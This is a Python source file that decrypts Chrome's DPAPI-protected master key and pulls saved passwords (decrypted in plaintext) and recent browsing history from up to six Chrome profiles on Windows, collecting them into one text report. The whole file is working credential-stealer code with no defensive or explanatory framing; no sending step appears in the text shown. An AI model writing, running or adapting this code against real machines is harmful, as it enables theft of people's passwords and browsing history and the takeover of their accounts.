import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES

def get_master_key():
    local_state_path = os.path.join(
        os.environ['USERPROFILE'],
        r'AppData\Local\Google\Chrome\User Data\Local State'
    )

    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state = json.load(file)

    encrypted_key_b64 = local_state['os_crypt']['encrypted_key']
    encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # Strip DPAPI prefix
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key


def decrypt_password(encrypted_password: bytes, master_key: bytes) -> str:
    try:
        if encrypted_password[:3] == b'v10':
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload[:-16])  # exclude the tag
            return decrypted.decode()
        else:
            # For older versions of Chrome (legacy DPAPI encrypted)
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
    except Exception as e:
        return f"(decryption error: {e})"

def extract_chrome_data():
    from datetime import datetime, timedelta
    global login_db_path
    master_key = get_master_key()
    results = ""
    profiles = ['Default'] + [f'Profile {i}' for i in range(1, 6)]
    found_any = False

    for profile in profiles:
        user_data_path = os.path.join(
            os.environ["USERPROFILE"],
            f"AppData\\Local\\Google\\Chrome\\User Data\\{profile}"
        )

        login_db = os.path.join(user_data_path, "Login Data")
        history_db = os.path.join(user_data_path, "History")

        if not os.path.exists(login_db) and not os.path.exists(history_db):
            continue  # Try next profile

        results += f"\n=== Profile: {profile} ===\n\n"

        # Handle Passwords
        if os.path.exists(login_db):
            temp_login = "Loginvault.db"
            try:
                shutil.copy2(login_db, temp_login)
                conn = sqlite3.connect(temp_login)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                rows = cursor.fetchall()
                conn.close()
                os.remove(temp_login)

                if rows:
                    results += "--- Saved Passwords ---\n"
                    for url, user, encrypted_password in rows:
                        if encrypted_password:
                            password = decrypt_password(encrypted_password, master_key)
                        else:
                            password = "(Empty)"
                        results += f"URL: {url}\nUsername: {user}\nPassword: {password}\n{'-'*30}\n"
                    found_any = True
                else:
                    results += "[i] No passwords found.\n"

            except Exception as e:
                results += f"[!] Error reading passwords: {e}\n"

        # Handle History
        if os.path.exists(history_db):
            temp_hist = "HistoryTemp.db"
            try:
                shutil.copy2(history_db, temp_hist)
                conn = sqlite3.connect(temp_hist)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                rows = cursor.fetchall()
                conn.close()
                os.remove(temp_hist)

                if rows:
                    results += "\n--- Recent History ---\n"
                    for url, title, timestamp in rows:
                        # Convert Chrome timestamp to readable format
                        visit_time = datetime(1601, 1, 1) + timedelta(microseconds=timestamp)
                        results += f"Title: {title}\nURL: {url}\nVisited: {visit_time}\n{'-'*30}\n"
                    found_any = True
                else:
                    results += "[i] No history found.\n"

            except Exception as e:
                results += f"[!] Error reading history: {e}\n"

    if not found_any:
        results += "\nNo data found in any profile.\n"

    return results


